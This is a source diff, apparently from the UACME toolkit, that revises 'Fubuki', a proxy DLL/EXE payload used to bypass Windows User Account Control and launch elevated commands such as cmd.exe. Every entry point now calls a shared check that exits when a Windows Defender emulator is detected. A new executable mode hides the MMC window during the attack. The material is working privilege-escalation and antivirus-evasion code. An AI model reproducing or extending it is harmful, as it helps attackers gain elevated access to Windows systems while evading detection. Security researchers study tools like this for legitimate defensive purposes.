@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.71
 *
-*  DATE:        21 Jul 2026
+*  DATE:        23 Jul 2026
 *
 *  Proxy dll entry point.
 *
@@ -22,6 +22,12 @@
 UACME_PARAM_BLOCK g_SharedParams;
 HANDLE g_SyncMutant = NULL;
 
+typedef enum _FUBUKI_MODE {
+    DllMode = 0,
+    ExeMode,
+    MaxMode
+} FUBUKI_MODE;
+
 /*
 * DummyFunc
 *
@@ -36,16 +42,23 @@ VOID WINAPI DummyFunc(
 {
 }
 
+FORCEINLINE VOID RunEmulCheck()
+{
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        RtlExitUserProcess('foff');
+    }
+}
+
 /*
-* DefaultPayload
+* FubukiDefaultPayload
 *
 * Purpose:
 *
 * Process parameter if exist or start cmd.exe and exit immediately.
 *
 */
-VOID DefaultPayload(
-    VOID
+VOID FubukiDefaultPayload(
+    FUBUKI_MODE FubukiMode
 )
 {
     BOOL bSharedParamsReadOk;
@@ -73,6 +86,12 @@ VOID DefaultPayload(
     }
 
     ucmLogDbgMsg(L"[Fubuki] Before ucmLaunchPayload\r\n");
+
+    if (FubukiMode == ExeMode) {
+        if (g_SharedParams.ParentIsMMC) {
+            ucmHideMmc();
+        }
+    }
 
     ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);
 
@@ -174,7 +193,7 @@ VOID UiAccessMethodPayload(
     //
     if (lpTargetApp) {
         if (_strcmpi(lpFileName, lpTargetApp) == 0) {
-            DefaultPayload();
+            FubukiDefaultPayload(DllMode);
         }
     }
     else {
@@ -183,7 +202,7 @@ VOID UiAccessMethodPayload(
         //
         if (ucmGetProcessElevationType(NULL, &TokenType)) {
             if (TokenType == TokenElevationTypeFull) {
-                DefaultPayload();
+                FubukiDefaultPayload(DllMode);
             }
         }
     }
@@ -207,9 +226,7 @@ BOOL WINAPI UiAccessMethodDllMain(
     WCHAR szMMC[] = { L'm', L'm', L'c', L'.', L'e', L'x', L'e', 0 };
     UNREFERENCED_PARAMETER(lpvReserved);
 
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        RtlExitUserProcess('foff');
-    }
+    RunEmulCheck();
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
         UiAccessMethodPayload(hinstDLL, TRUE, szMMC);
@@ -235,12 +252,10 @@ BOOL WINAPI DllMain(
     UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
    
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        RtlExitUserProcess('foff');
-    }
+    RunEmulCheck();
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        DefaultPayload();
+        FubukiDefaultPayload(DllMode);
     }
 
     return TRUE;
@@ -258,10 +273,8 @@ VOID WINAPI EntryPointExeMode(
     VOID
 )
 {
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        RtlExitUserProcess('foff');
-    }
-    DefaultPayload();
+    RunEmulCheck();
+    FubukiDefaultPayload(ExeMode);
 }
 
 /*
@@ -279,9 +292,7 @@ VOID WINAPI EntryPointUIAccessLoader(
     ULONG r = 0;
     WCHAR szParam[MAX_PATH * 2];
 
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        RtlExitUserProcess('foff');
-    }
+    RunEmulCheck();
 
     if (GetCommandLineParam(GetCommandLine(), 0, szParam, MAX_PATH, &r)) {
         if (r > 0) {
@@ -303,11 +314,8 @@ VOID WINAPI EntryPointUIAccessLoader2(
     VOID
 )
 {
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        RtlExitUserProcess('foff');
-    }
-    ucmUIHackExecute2();
-    
+    RunEmulCheck();
+    ucmUIHackExecute2();   
     RtlExitUserProcess(0);
 }
 
@@ -331,11 +339,9 @@ BOOL WINAPI EntryPointSxsConsent(
 
     UNREFERENCED_PARAMETER(lpvReserved);
 
+    RunEmulCheck();
+
     ucmLogDbgMsg(FubukiLoadedMsg);
-
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
-        RtlExitUserProcess('foff');
-
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
 
@@ -391,10 +397,9 @@ BOOL WINAPI EntryPointR41N3RZUF477(
 
     UNREFERENCED_PARAMETER(lpvReserved);
 
-    ucmLogDbgMsg(FubukiLoadedMsg);
+    RunEmulCheck();
 
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
-        RtlExitUserProcess('foff');
+    ucmLogDbgMsg(FubukiLoadedMsg);
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
 
